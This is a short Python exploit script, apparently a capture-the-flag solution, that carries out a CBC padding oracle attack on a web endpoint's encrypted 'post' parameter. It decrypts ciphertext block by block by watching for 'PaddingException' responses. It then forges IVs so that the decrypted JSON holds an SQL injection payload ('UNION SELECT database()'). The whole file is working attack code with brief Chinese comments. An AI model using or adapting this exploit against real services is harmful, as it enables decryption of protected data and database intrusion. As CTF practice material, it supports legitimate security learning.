
import base64
import requests

def decode(data):
    return base64.b64decode(data.replace('~', '=').replace('!', '/').replace('-', '+'))

def encode(data):
    return base64.b64encode(data).decode('utf-8').replace('=', '~').replace('/', '!').replace('+', '-')

def bxor(b1, b2): # use xor for bytes
    result = b""
    for b1, b2 in zip(b1, b2):
        result += bytes([b1 ^ b2])
    return result

def test(url, data):
    r = requests.get(url+'?post={}'.format(data))
    if 'PaddingException' in r.text:
        return False
    else:
        return True

def generate_iv_list(tail):
    iv = b'\x00' * (16 - len(tail) -1)
    return [iv+bytes([change])+tail for change in range(0x00, 0xff+1)]

def padding_oracle(real_iv, url, data):
    index = 15
    plains = bytes()
    tail = bytes()
    while index >= 0:
        for iv in generate_iv_list(tail):
            if test(url, encode(iv+data)):
                plains = bytes([(16-index) ^ iv[index]]) + plains
                index -= 1
                tail = bytes([plain ^ (16-index) for plain in plains])
                break
    return bxor(real_iv, plains)

if __name__ == '__main__':
    post = '1TMr5!UJDHasCZMOtRUdbnx9V71YmBBFWPl4arCKvRulEwHdv7BoqMpyMU35xe-FDncmlKnSnQxnhuxBBv0Td!hS-OOw0D9t6-LAeaG39hXB!!-ryqBEoympPVisggxBl-rptIs7rnDUGyWS7TFeof-4K!9QCLytJd81Mzuq--8h1TLpBLFontBi4iGlLTtumXR7uhxr-hdnHrQAi9JIMg~~'
    data = decode(post)[16*(1+5):]    
    iv_6 = decode(post)[16*(1+4):16*(1+5)]    

    print("Data: ", data)
    print("iv: ", iv_6)

    immediate = bxor(b'$FLAG$", "id": "', iv_6)    # 第6个分组密文解密的直接结果
    print("immediate: ", immediate)

    # iv = bxor(immediate, b'{"id":"4 0 UNION SELECT database(), \'\'", "key":"U3pjcAxbk2zG-00vTtlD1Q~~"')    # 计算出合适的IV
    iv = bxor(immediate, b'{"id":"4 0 UNION SELECT database()", "i":"')    # 计算出合适的IV
    iv = bxor(immediate, b'{"id":"4", "i":"')    # 计算出合适的IV
    print("iv", iv)

    
    print(encode(iv+data))